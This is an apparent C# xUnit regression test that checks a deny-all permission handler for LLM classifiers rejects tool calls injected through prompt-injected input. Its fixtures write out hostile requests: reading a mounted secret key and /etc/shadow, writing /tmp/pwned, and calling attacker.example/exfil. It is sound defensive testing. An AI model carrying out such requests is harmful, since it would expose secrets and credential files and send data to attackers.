using Agentweaver.Api.Coordinator;
using FluentAssertions;
using GitHub.Copilot;
using GitHub.Copilot.Rpc;
using Xunit;

namespace Agentweaver.Tests.Coordinator;

/// <summary>
/// Regression tests for the "tool-less" LLM classifier hardening (findings-agent-runtime Alert 2).
///
/// The classifiers (<see cref="CopilotWorkflowSelectionModel"/>, <c>OutcomeSpecReplyClassifier</c>,
/// <c>AssemblyGateCodeClassifier</c>, <c>StoryIndependenceClassifier</c>, <c>PreviewClassifier</c>)
/// run a single grounded completion over user-controlled text. Setting <c>SessionConfig.Tools = []</c>
/// does NOT disable the Copilot SDK's built-in native tools — so each classifier now also sets
/// <c>AvailableTools = []</c> AND installs <see cref="CopilotWorkflowSelectionModel.RejectAllToolPermissionHandler"/>
/// as the deny-by-default backstop. These tests prove the shared handler rejects EVERY tool a
/// prompt-injected input could try to invoke (shell/file/search/web/custom), so the classifier is
/// physically unable to touch the host.
/// </summary>
public sealed class ToollessClassifierGatingTests
{
    public static IEnumerable<object[]> InjectedToolRequests()
    {
        // A prompt-injected task/workflow description could coerce the model into any of these.
        yield return [new PermissionRequestShell
        {
            FullCommandText = "cat /mnt/secrets-store/mcp-api-key",
            Intention = "exfiltrate secrets",
            Commands = [],
            HasWriteFileRedirection = false,
            PossiblePaths = [],
            PossibleUrls = [],
            CanOfferSessionApproval = false,
        }];
        yield return [new PermissionRequestRead
        {
            Path = "/etc/shadow",
            Intention = "read protected file",
            ToolCallId = "inj-read",
        }];
        yield return [new PermissionRequestWrite
        {
            FileName = "/tmp/pwned",
            ToolCallId = "inj-write",
            Intention = "overwrite file",
            Diff = "+pwned",
            CanOfferSessionApproval = false,
        }];
        yield return [new PermissionRequestUrl
        {
            Url = "https://attacker.example/exfil",
            Intention = "exfiltrate",
            ToolCallId = "inj-url",
        }];
        yield return [new PermissionRequestCustomTool
        {
            ToolName = "run_command",
            ToolCallId = "inj-custom",
            ToolDescription = "shell",
            Args = System.Text.Json.JsonSerializer.SerializeToElement(new { command = "id" }),
        }];
    }

    [Theory]
    [MemberData(nameof(InjectedToolRequests))]
    public async Task RejectAllToolPermissionHandler_denies_every_injected_tool_request(
        PermissionRequest request)
    {
        var decision = await CopilotWorkflowSelectionModel.RejectAllToolPermissionHandler(
            request, new PermissionInvocation());

        var rejected = decision.Should().BeOfType<PermissionDecisionReject>(
            "a tool-less classifier must never approve a tool call, even one injected via its input")
            .Subject;
        rejected.Feedback.Should().NotBeNullOrWhiteSpace();
    }
}
